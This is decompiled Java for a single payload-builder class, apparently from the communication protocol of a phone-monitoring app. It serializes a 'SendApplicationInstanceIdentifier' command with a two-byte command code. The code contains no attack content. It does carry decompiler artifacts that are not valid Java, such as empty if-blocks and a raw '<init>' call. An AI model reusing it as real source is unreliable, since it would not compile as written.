package com.vvt.phoenix.prot.databuilder;

import com.vvt.phoenix.a.b;
import com.vvt.phoenix.prot.a.e;
import com.vvt.phoenix.prot.command.u;
import java.io.OutputStream;

public class z
  extends r
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  protected OutputStream a(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)34);
    int i = 2;
    paramOutputStream.write(arrayOfByte, 0, i);
    bool = a;
    if (bool) {}
    return paramOutputStream;
  }
  
  protected String a()
  {
    return "SendApplicationInstanceIdentifierPayloadBuilder";
  }
  
  protected OutputStream b(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = c();
    bool = localObject instanceof u;
    IllegalArgumentException localIllegalArgumentException;
    if (bool)
    {
      localObject = e.a((u)c());
      localIllegalArgumentException = null;
      int i = localObject.length;
      paramOutputStream.write((byte[])localObject, 0, i);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return paramOutputStream;
      localObject = a();
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      String str = "Command data is not an instance of SendApplicationInstanceIdentifier";
      localIllegalArgumentException.<init>(str);
      b.a((String)localObject, localIllegalArgumentException);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/z.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */